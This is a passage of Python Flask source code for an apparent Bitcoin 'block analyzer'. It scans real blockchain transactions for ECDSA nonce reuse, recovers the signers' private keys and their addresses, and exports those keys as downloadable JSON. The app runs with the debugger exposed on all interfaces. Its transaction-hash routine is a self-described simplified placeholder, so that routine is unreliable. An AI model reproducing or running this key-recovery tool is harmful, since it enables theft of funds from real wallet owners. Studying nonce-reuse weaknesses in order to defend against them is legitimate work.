    def _build_tx_for_hash(self, tx_data: Dict, vin: Dict) -> str:
        """Build transaction string for SIGHASH calculation (simplified)"""
        try:
            # This is a simplified version - in production, implement proper Bitcoin transaction hashing
            tx_parts = [
                str(tx_data.get('version', 1)),
                str(len(tx_data.get('vin', []))),
                vin.get('txid', ''),
                str(vin.get('vout', 0)),
                str(len(tx_data.get('vout', [])))
            ]
            return '|'.join(tx_parts)
        except Exception as e:
            logging.error(f"Error building transaction for hash: {e}")
            return ''

@app.route('/test_manual_recovery')
def test_manual_recovery():
    """Test manual K-reuse recovery with real transaction data"""
    try:
        analyzer = BitcoinBlockAnalyzer()
        
        # Fetch real transaction data with potential k-reuse vulnerability
        test_data = analyzer._fetch_test_transaction_data()
        
        if not test_data:
            return jsonify({
                'success': False,
                'error': 'Could not fetch suitable test transaction data',
                'message': 'No transactions with k-reuse vulnerability found in recent blocks'
            })
        
        r = test_data['r']
        signatures = test_data['signatures']
        
        logging.info(f"Testing K-reuse recovery with real transaction data:")
        logging.info(f"R: {hex(r)}")
        logging.info(f"Found {len(signatures)} signatures with same R-value")
        
        # Try different signature pairs for recovery
        recovery_attempts = []
        successful_recovery = None
        attempt_pairs_evaluated = 0

        for i in range(len(signatures)):
            for j in range(i + 1, len(signatures)):
                sig1 = signatures[i]
                sig2 = signatures[j]

                attempt_pairs_evaluated += 1

                k_value_hex = None
                try:
                    numerator = (sig1['z'] - sig2['z']) % analyzer.N
                    denominator = (sig1['s'] - sig2['s']) % analyzer.N
                    if denominator != 0:
                        denominator_inv = pow(denominator, analyzer.N - 2, analyzer.N)
                        k_value = (numerator * denominator_inv) % analyzer.N
                        k_value_hex = hex(k_value)
                    else:
                        logging.debug("Skipping pair due to zero denominator when computing nonce k")
                except Exception as nonce_error:
                    logging.debug(f"Failed to compute nonce for signature pair ({i}, {j}): {nonce_error}")

                # Attempt private key recovery using k-reuse attack
                recovered_key = analyzer._recover_private_key_from_k_reuse(
                    r, sig1['s'], sig2['s'], sig1['z'], sig2['z']
                )

                if recovered_key:
                    # Validate the recovered key
                    validation_result = analyzer._validate_recovered_private_key(
                        recovered_key, r, sig1['s'], sig1['z']
                    )

                    # Generate addresses from the recovered key
                    addresses = analyzer._generate_addresses_from_wif(recovered_key)

                    private_key_hex = validation_result.get('private_key_hex')
                    if isinstance(private_key_hex, str):
                        private_key_hex = private_key_hex[2:] if private_key_hex.startswith('0x') else private_key_hex
                        private_key_hex = private_key_hex.zfill(64)

                    attempt_details = {
                        'signature_pair': [i, j],
                        'transaction_ids': [sig1['txid'], sig2['txid']],
                        'k_value': k_value_hex,
                        'private_key_wif': recovered_key,
                        'private_key_hex': private_key_hex,
                        'validation_result': validation_result,
                        'addresses': addresses,
                        'r_value': hex(r),
                        's_values': [sig1['s'], sig2['s']],
                        'z_values': [sig1['z'], sig2['z']]
                    }

                    recovery_attempts.append(attempt_details)

                    if validation_result.get('valid') and not successful_recovery:
                        successful_recovery = {
                            'private_key_wif': recovered_key,
                            'private_key_hex': private_key_hex,
                            'attack_method': 'ECDSA nonce reuse (k-reuse)',
                            'recovery_pair': {
                                'indices': [i, j],
                                'transactions': [sig1['txid'], sig2['txid']]
                            },
                            'k_value': k_value_hex,
                            'transaction_ids': [sig1['txid'], sig2['txid']],
                            'primary_transaction_id': sig1['txid'],
                            'block_height': test_data.get('block_height'),
                            'block_hash': test_data.get('block_hash'),
                            'r_value': hex(r),
                            's_values': [sig1['s'], sig2['s']],
                            'addresses': addresses,
                            'validation_result': validation_result
                        }

        return jsonify({
            'success': True,
            'test_data': {
                'r': hex(r),
                'signatures_count': len(signatures),
                'transaction_ids': [sig['txid'] for sig in signatures],
                'block_height': test_data.get('block_height'),
                'block_hash': test_data.get('block_hash')
            },
            'recovery_attempts': recovery_attempts,
            'total_attempts': len(recovery_attempts),
            'successful_recoveries': len([
                attempt for attempt in recovery_attempts if attempt['validation_result'].get('valid')
            ]),
            'attempt_pairs_evaluated': attempt_pairs_evaluated,
            'successful_recovery': successful_recovery
        })
        
    except Exception as e:
        logging.error(f"Error in test_manual_recovery: {e}")
        return jsonify({
            'success': False,
            'error': str(e),
            'message': 'Failed to perform manual recovery test'
        })

@app.route('/export/<analysis_key>')
def export_analysis(analysis_key):
    """Export analysis results"""
    analysis = AnalysisResult.query.filter_by(analysis_key=analysis_key).first_or_404()
    vulnerabilities = Vulnerability.query.filter_by(analysis_key=analysis_key).all()

    export_data = {
        'analysis_key': analysis_key,
        'block_input': analysis.block_input,
        'status': analysis.status,
        'vulnerability_count': analysis.vulnerability_count,
        'started_at': analysis.started_at.isoformat() if analysis.started_at else None,
        'completed_at': analysis.completed_at.isoformat() if analysis.completed_at else None,
        'result_data': json.loads(analysis.result_data) if analysis.result_data else {},
        'vulnerabilities': []
    }

    for vuln in vulnerabilities:
        vuln_data = {
            'type': vuln.vulnerability_type,
            'txid': vuln.txid,
            'risk_level': vuln.risk_level,
            'details': json.loads(vuln.details) if vuln.details else {},
            'private_key': vuln.private_key,
            'addresses': json.loads(vuln.addresses) if vuln.addresses else {},
            'created_at': vuln.created_at.isoformat()
        }
        export_data['vulnerabilities'].append(vuln_data)

    response = jsonify(export_data)
    response.headers['Content-Disposition'] = f'attachment; filename=analysis_{analysis_key}.json'
    return response

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)